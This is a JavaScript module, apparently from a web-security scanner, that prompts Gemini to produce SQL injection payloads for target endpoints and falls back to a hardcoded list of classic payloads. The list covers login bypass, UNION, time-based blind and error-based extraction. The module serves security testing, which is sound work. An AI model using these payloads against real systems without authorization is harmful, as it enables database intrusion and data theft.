import { GoogleGenerativeAI } from "@google/generative-ai";

const GEMINI_API_KEY = process.env.GEMINI_API_KEY || "";

if (!GEMINI_API_KEY) {
  console.warn("⚠️  GEMINI_API_KEY not set. Payload generation will use fallback payloads.");
}

/**
 * Initialize Gemini AI
 */
const getGeminiModel = () => {
  if (!GEMINI_API_KEY) {
    return null;
  }
  
  try {
    const genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
    // Use gemini-2.5-flash (user's preferred model)
    // If the exact model name differs, try alternatives:
    // - gemini-2.0-flash-exp
    // - gemini-2.0-flash-thinking-exp
    // - gemini-2.5-flash-latest
    const modelNames = [
      "gemini-2.5-flash",
      "gemini-2.0-flash-exp",
      "gemini-2.0-flash-thinking-exp",
      "gemini-2.5-flash-latest",
      "gemini-1.5-flash",
      "gemini-1.5-pro"
    ];
    
    for (const modelName of modelNames) {
      try {
        const model = genAI.getGenerativeModel({ model: modelName });
        console.log(`✅ Using Gemini model: ${modelName}`);
        return model;
      } catch (e) {
        // Try next model name
        continue;
      }
    }
    
    // If all models fail, return null to use fallback payloads
    console.warn("⚠️  Could not initialize any Gemini model, using fallback payloads");
    return null;
  } catch (error) {
    console.error("❌ Error initializing Gemini:", error.message);
    return null;
  }
};

/**
 * Generate SQL injection payloads using Gemini AI
 */
export const generateSQLPayloads = async (endpoint, context = {}) => {
  console.log(`🔮 Generating payloads for endpoint: ${endpoint.url}`);
  
  const model = getGeminiModel();
  
  // Always return payloads - use Gemini if available, otherwise fallback
  let payloads = [];
  
  if (model) {
    try {
      const prompt = `Generate 10 creative and effective SQL injection payloads for testing web application security.

Endpoint: ${endpoint.url}
Method: ${endpoint.method}
URL Parameters: ${JSON.stringify(endpoint.urlParams || {})}
Body Parameters: ${JSON.stringify(endpoint.bodyParams || {})}

Context: ${JSON.stringify(context)}

Generate SQL injection payloads that:
1. Test for basic SQL injection (UNION, OR, etc.)
2. Test for time-based blind SQL injection
3. Test for boolean-based blind SQL injection
4. Test for error-based SQL injection
5. Include payloads for different database types (MySQL, PostgreSQL, MSSQL, Oracle)

Return ONLY a JSON array of payload strings, no explanations, no markdown, just the array. Example format:
["' OR '1'='1", "' UNION SELECT NULL--", "1' AND SLEEP(5)--"]

Payloads:`;

      const result = await model.generateContent(prompt);
      const response = await result.response;
      const text = response.text();
      
      console.log(`📝 Gemini raw response (first 200 chars): ${text.substring(0, 200)}`);
      
      // Extract JSON array from response
      try {
        // Try to parse as JSON
        const jsonMatch = text.match(/\[.*\]/s);
        if (jsonMatch) {
          payloads = JSON.parse(jsonMatch[0]);
        } else {
          // Fallback: split by lines and clean
          payloads = text
            .split("\n")
            .map((line) => line.trim().replace(/^["']|["']$/g, ""))
            .filter((line) => line.length > 0 && (line.startsWith("'") || line.includes("OR") || line.includes("UNION") || line.includes("AND")));
        }
      } catch (e) {
        console.warn("⚠️  Failed to parse Gemini response, using fallback payloads");
        payloads = [];
      }
    } catch (error) {
      console.error("❌ Error generating payloads with Gemini:", error.message);
      payloads = [];
    }
  }
  
  // If Gemini didn't provide payloads or is not available, use fallback
  if (payloads.length === 0) {
    console.log("📦 Using fallback SQL injection payloads");
    payloads = getFallbackSQLPayloads();
  }
  
  console.log(`✅ Generated ${payloads.length} SQL injection payloads`);
  return payloads.slice(0, 20); // Limit to 20 payloads
};

/**
 * Fallback SQL injection payloads if Gemini is not available
 */
export const getFallbackSQLPayloads = () => {
  return [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR 1=1 LIMIT 1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' GROUP BY 1--",
    "' HAVING 1=1--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1' AND '1'='1",
    "1' AND '1'='2",
  ];
};
